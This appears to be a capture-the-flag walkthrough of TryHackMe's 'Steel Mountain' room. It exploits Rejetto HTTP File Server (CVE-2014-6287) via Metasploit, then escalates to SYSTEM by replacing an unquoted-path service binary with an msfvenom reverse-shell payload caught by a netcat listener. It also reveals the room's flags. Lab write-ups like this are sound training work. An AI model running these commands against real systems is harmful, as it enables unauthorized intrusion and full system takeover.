# [Steel Mountain - TryHackMe](https://tryhackme.com/room/steelmountain) | Cyanyde

Hack into a Mr. Robot themed Windows machine. Use metasploit for initial access, utilise powershell for Windows privilege escalation enumeration and learn a new technique to get Administrator access.

## Credits

- Room created by [tryhackme](https://tryhackme.com/p/tryhackme)
- Room type: Premium

## Initial Access

### Scan the machine with nmap. What is the other port running a web server on?

- `nmap -sV -p- -T5 \<target ip>`
    - *-sV* flag returns service versions
    - *-p-* scans all ports
    - *-T5* increases scan timing agressiveness

```
PORT      STATE SERVICE            VERSION
80/tcp    open  http               Microsoft IIS httpd 8.5
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
3389/tcp  open  ssl/ms-wbt-server?
5985/tcp  open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
8080/tcp  open  http               HttpFileServer httpd 2.3
47001/tcp open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
49155/tcp open  msrpc              Microsoft Windows RPC
49156/tcp open  msrpc              Microsoft Windows RPC
49188/tcp open  msrpc              Microsoft Windows RPC
49189/tcp open  msrpc              Microsoft Windows RPC
```

> The non-standard port running a web server is port **8080**

### Take a look at the other web server. What file server is running?

> A quick web search shows that HttpFileServer httpd 2.3 is a version of **Rejetto HTTP File Server**

### What is the CVE number to exploit this file server?

> ExploitDB listing from searching for "rejetto http file server vulnerability": https://www.exploit-db.com/exploits/39161 | CVE-**2014-6287**

### Use Metasploit to get an initial shell. What is the user flag?

- `msfconsole` to start Metasploit and `search cve-2014-6287` to find module listed on ExploitDB
- `use 0` or `use exploit/windows/http/rejetto_hfs_exec` to select exploit
- `set RHOSTS <target ip>` and `set RPORT 8080` to point the exploit at the second web server on the target machine and `exploit`

> <details><summary>When connected to the target via meterpreter shell, <code>cat C:/Users/bill/Desktop/user.txt</code> to get the flag: </summary>b04763b6fcf51fcd7c13abc7db4fd365</details>

## Privilege Escalation

- Use the [provided tool](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1) to enumerate system
    - *curl* or *wget* the file to attack machine
    - Use `upload` in meterpreter shell to transfer file to target machine

### Take close attention to the CanRestart option that is set to true. What is the name of the service which shows up as an unquoted service path vulnerability?

- Run `PowerUp.ps1` then use the `Invoke-AllChecks` cmdlet

```
ServiceName    : AdvancedSystemCareService9
Path           : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=AppendData/AddSubdirectory}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'AdvancedSystemCareService9' -Path <HijackPath>
CanRestart     : True
Name           : AdvancedSystemCareService9
Check          : Unquoted Service Paths
```

> The service that shows up is **AdvancedSystemCareService9**

### What is the root flag?

- The *PowerUp* scan results show that the service can be restarted, and the path can be edited
- Generate shellcode to replace legitimate binary
    - `msfvenom -p windows/shell_reverse_tcp LHOST=10.201.67.109 LPORT=4443 -e x86/shikata_ga_nai -f exe-service -o ASCService.exe`
- Kill the powershell channel with *ctrl+c*
- Use <code>upload *local path to*\ASCService.exe</code> in meterpreter shell
- `shell` to drop into cmd shell
- Kill and replace existing service
    - `sc stop AdvancedSystemCareService9` to kill service
    - `copy ASCService.exe "C:\Program Files (x86)\IObit\Advanced SystemCare\"` and confirm replacement of the original ASCService.exe
- Set up listener on attacker machine
    - `nc -lvnp 4443`
- Start malicious process on target machine
    - `sc start AdvancedSystemCareService9`
- Restarting the service on target machine should send a reverse shell to the port specified in the malicious ASCService.exe
- Within the reverse shell, find and print the root flag
    - `whoami` to confirm SYSTEM status
    - `dir /s root.txt` to locate the flag file
    - cd `C:\Users\Administrator\Desktop` and `type root.txt` to get the flag

> <details><summary>The root flag of this machine is </summary>9af5f314f57607c00fd09803a587db80</details>

## Access and Escalation without Metasploit

- Use [this](https://www.exploit-db.com/exploits/49125) exploit
- Syntax: `python3 exploit.py RHOST RPORT command`
- Create reverse shell with msfvenom
    - `msfvenom -p windows/shell_reverse_tcp LHOST=<target machine> LPORT=4443 -e x86/shikata_ga_nai -i 9 -f psh -o shell.ps1`

